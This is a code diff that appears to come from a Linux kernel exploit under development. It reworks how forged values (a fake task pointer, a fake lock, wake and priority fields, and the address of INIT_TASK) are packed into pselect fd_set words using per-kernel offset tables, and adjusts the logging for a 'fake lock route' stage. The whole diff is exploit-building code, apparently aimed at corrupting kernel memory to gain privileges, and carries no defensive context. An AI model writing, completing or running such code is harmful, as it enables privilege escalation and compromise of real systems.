@@ -96,20 +96,6 @@ static int pselect_put_global_word(
   }
 }
 
-static void pselect_put_waiter_word(
-    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
-    int waiter_word, uint64_t value, const char *name) {
-  int global_word = PSELECT_WAITER_WORD_SHIFT + waiter_word;
-  int placed = pselect_put_global_word(
-      in, out, ex, words_per_set, global_word, value);
-  if (!placed) {
-    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
-               "words_per_set=%d nfds=%d\n",
-               name, waiter_word, global_word, words_per_set,
-               PSELECT_ROUTE_NFDS);
-  }
-}
-
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
   (void)write_fd;
@@ -148,21 +134,29 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 
   int words_per_set = pselect_words_per_set();
 
-  /* Use the per-kernel word table from offsets.h */
   for (int i = 0; i < 20 && active_offsets->pselect_words[i].word >= 0; i++) {
     int word = active_offsets->pselect_words[i].word;
     uint64_t value;
     switch (active_offsets->pselect_words[i].value_flag) {
       case WV_ZERO: value = 0; break;
       case WV_PRIO: value = 1; break;
-      case WV_TASK: value = pselect_custom_write_enabled()
-                            ? fake_task : text_addr(INIT_TASK); break;
+      case WV_TASK:
+        value = pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK);
+        break;
       case WV_LOCK: value = fake_lock; break;
       case WV_WAKE: value = 3; break;
-      case WV_WAKE_PRIO: value = 3 | (1ULL << 32); break; /* packed: low32=wake, high32=prio */
+      case WV_WAKE_PRIO: value = 3 | (1ULL << 32); break;
       default: value = 0; break;
     }
-    pselect_put_waiter_word(in, out, ex, words_per_set, word, value, "w");
+
+    int global_word = PSELECT_WAITER_WORD_SHIFT + word;
+    int placed = pselect_put_global_word(in, out, ex, words_per_set,
+                                         global_word, value);
+    if (!placed) {
+      pr_warning("pselect cannot place waiter_word=%d global_word=%d "
+                 "words_per_set=%d nfds=%d\n",
+                 word, global_word, words_per_set, PSELECT_ROUTE_NFDS);
+    }
   }
 }
 
@@ -221,8 +215,8 @@ void do_pselect_fake_lock_route(void) {
     prepare_pselect_fdsets(&in, &out, &ex);
     pr_info("pselect route setup attempt=%d simple=%d shift=%d page=%016zx "
             "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
-            "in0=%016llx in3=%016llx out0=%016llx out3=%016llx out4=%016llx "
-            "ex0=%016llx ex1=%016llx ex2=%016llx ex3=%016llx\n",
+            "in0=%016llx in3=%016llx out0=%016llx out4=%016llx "
+            "ex0=%016llx ex1=%016llx ex2=%016llx ex3=%016llx ex4=%016llx\n",
             route_attempt,
             env_flag("PSELECT_SIMPLE_LAYOUT", 0),
             PSELECT_WAITER_WORD_SHIFT,
@@ -230,12 +224,12 @@ void do_pselect_fake_lock_route(void) {
             (unsigned long long)fdset_get_word(&in, 0),
             (unsigned long long)fdset_get_word(&in, 3),
             (unsigned long long)fdset_get_word(&out, 0),
-            (unsigned long long)fdset_get_word(&out, 3),
             (unsigned long long)fdset_get_word(&out, 4),
             (unsigned long long)fdset_get_word(&ex, 0),
             (unsigned long long)fdset_get_word(&ex, 1),
             (unsigned long long)fdset_get_word(&ex, 2),
-            (unsigned long long)fdset_get_word(&ex, 3));
+            (unsigned long long)fdset_get_word(&ex, 3),
+            (unsigned long long)fdset_get_word(&ex, 4));
     open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
 
     atomic_store(&consumer_calls, 0);
